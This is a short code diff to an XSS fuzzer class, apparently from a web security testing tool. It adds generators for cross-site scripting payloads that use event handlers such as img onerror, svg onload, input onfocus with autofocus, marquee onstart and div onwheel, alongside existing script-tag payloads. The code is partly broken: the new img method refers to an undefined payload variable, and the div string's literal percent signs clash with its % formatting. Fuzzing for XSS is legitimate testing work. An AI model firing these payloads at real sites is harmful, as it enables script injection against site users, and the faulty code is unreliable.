@@ -20,8 +20,22 @@ class XSS(Fuzzer):
         return "<script>alert(/xss/)</script>"
 
     def img(self):
-        payload = "<img src='%s'></img>" % self.url
-        return payload
+        return '<img/onerror="%s"/src=x>' % payload
+
+    def svg(self, payload):
+        return '<svg/onload="%s"/>' % payload
+
+    def style(self, payload):
+        return '<style/onload="%s"></style>' % payload
+
+    def input(self, payload):
+        return '<input/onfocus="%s"/autofocus>' % payload
+
+    def marquee(self, payload):
+        return '<marquee/onstart="%s"></marquee>' % payload
+
+    def div(self, payload):
+        return '<div/onwheel="%s"/style="height:200%;width:100%"></div>' % payload
 
     def script(self):
         payload = "<script src='%s'></script>" % self.url
